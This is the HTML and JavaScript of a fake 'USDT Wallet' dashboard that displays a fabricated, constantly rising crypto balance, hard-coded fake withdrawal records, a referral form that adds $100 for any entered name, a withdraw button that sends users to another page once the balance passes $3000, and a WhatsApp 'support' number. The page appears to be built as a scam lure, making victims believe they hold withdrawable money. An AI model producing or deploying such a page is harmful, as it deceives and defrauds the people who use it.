<!DOCTYPE html> 
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>USDT Wallet</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(-45deg, #003d2a, #00694b, #00513b, #008b64);
      background-size: 400% 400%;
      animation: gradient 20s ease infinite;
      color: white;
    }

    @keyframes gradient {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      background: rgba(0, 0, 0, 0.6);
      padding: 25px 20px;
      border-radius: 15px;
      width: 300px;
      text-align: center;
      position: relative;
      box-shadow: 0 0 20px rgba(0,255,128,0.2);
      z-index: 1;
    }

    h2 {
      color: #00e99a;
      font-size: 1.3em;
      margin-bottom: 10px;
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border-radius: 8px;
      border: none;
      font-size: 1rem;
      box-sizing: border-box;
    }

    button {
      background: #00e99a;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #00c07a;
    }

    .balance {
      font-size: 1.2rem;
      margin: 12px 0;
    }

    .history, .referral-box {
      background-color: rgba(0, 128, 64, 0.1);
      padding: 8px;
      border-radius: 8px;
      font-size: 0.85em;
      margin-top: 12px;
      max-height: 90px;
      overflow-y: auto;
      text-align: left;
      color: #aaffcc;
    }

    .referral-box {
      background: rgba(0,255,128,0.1);
    }

    #whatsappBtn {
      background-color: #25D366;
      color: white;
      font-weight: bold;
      margin-top: 10px;
    }

    .top-notification {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0, 255, 128, 0.15);
      border: 1px solid rgba(0, 255, 128, 0.3);
      padding: 10px 16px;
      font-size: 0.9rem;
      color: #a8ffce;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 255, 128, 0.2);
      opacity: 0;
      pointer-events: none;
      z-index: 9999;
      transition: opacity 0.5s ease, transform 0.5s ease;
    }

    .top-notification.show {
      opacity: 1;
      transform: translateX(-50%) translateY(0);
    }
  </style>
</head>
<body>

  <div class="top-notification" id="topNotification"></div>

  <div class="container">
    <!-- Dashboard Only -->
    <div id="dashboardSection">
      <h2>USDT Wallet</h2>
      <div class="balance">Balance: <span id="balance">7000.00000000</span> USDT</div>
      <button onclick="handleWithdraw()">Withdraw</button>
      <button id="whatsappBtn">WhatsApp Support</button>
      <div class="referral-box">Your referral code: <b id="refcode">WalletUser</b></div>

      <!-- Optional referral input -->
      <input type="text" id="yourNameInput" placeholder="Enter your name" />
      <input type="text" id="refUsedBy" placeholder="Who used your code?" />
      <button id="submitReferralBtn" onclick="sendReferral()">Submit</button>

      <!-- Withdraw History -->
      <div class="history" id="withdraw-history"></div>
    </div>
  </div>

  <script>
    // Initialize balance and mining
    let balance = parseFloat(localStorage.getItem('usdtBalance')) || 7000;
    const usdtPerMs = 1 / 12000;
    let miningStarted = false;

    // Notification element
    const notificationEl = document.getElementById("topNotification");

    function showNotification(msg) {
      notificationEl.textContent = msg;
      notificationEl.classList.add("show");
      setTimeout(() => {
        notificationEl.classList.remove("show");
      }, 4000);
    }

    function updateBalance() {
      document.getElementById('balance').textContent = balance.toFixed(8);
    }

    function startMining() {
      if (!miningStarted) {
        setInterval(() => {
          balance += usdtPerMs;
          localStorage.setItem('usdtBalance', balance.toString());
          updateBalance();
        }, 10);
        miningStarted = true;
      }
    }

    function handleWithdraw() {
      if (balance >= 3000) {
        alert("Redirecting to withdrawal page...");
        window.location.href = "withdraw.html";
      } else {
        alert("Minimum withdrawal is $3000 USDT.");
      }
    }

    // Load withdraw history with predefined successful withdrawals
    function updateWithdrawHistory() {
      let hist = [
        "Successfully withdrew $5000 via Tether BSC BEP20",
        "Successfully withdrew $2000 via Tether BSC BEP20",
        "Successfully withdrew $12000 via Tether BSC BEP20"
      ];
      localStorage.setItem('withdrawHistory', JSON.stringify(hist));

      const el = document.getElementById('withdraw-history');
      el.innerHTML = hist.map(h => `<div>${h}</div>`).join('');
    }

    // Referral bonus system
    function sendReferral() {
      const usedBy = document.getElementById("refUsedBy").value.trim();
      const yourName = document.getElementById("yourNameInput").value.trim();

      if (!yourName || !usedBy) {
        alert("Please enter both your name and who used your code.");
        return;
      }

      balance += 100;
      localStorage.setItem('usdtBalance', balance.toString());
      updateBalance();

      let hist = JSON.parse(localStorage.getItem('withdrawHistory') || '[]');
      hist.unshift(`Referral bonus +$100 from ${usedBy}`);
      if (hist.length > 10) hist.pop();
      localStorage.setItem('withdrawHistory', JSON.stringify(hist));
      updateWithdrawHistory();

      alert("âœ… Referral submitted successfully. $100 added to your balance.");
      document.getElementById("refUsedBy").value = "";
      document.getElementById("yourNameInput").value = "";
    }

    document.getElementById('whatsappBtn').addEventListener('click', () => {
      const phoneNumber = '16723004545';
      const url = `https://wa.me/${phoneNumber}`;
      window.open(url, '_blank');
    });

    // Start dashboard
    updateBalance();
    updateWithdrawHistory();
    startMining();
  </script>
</body>
</html>
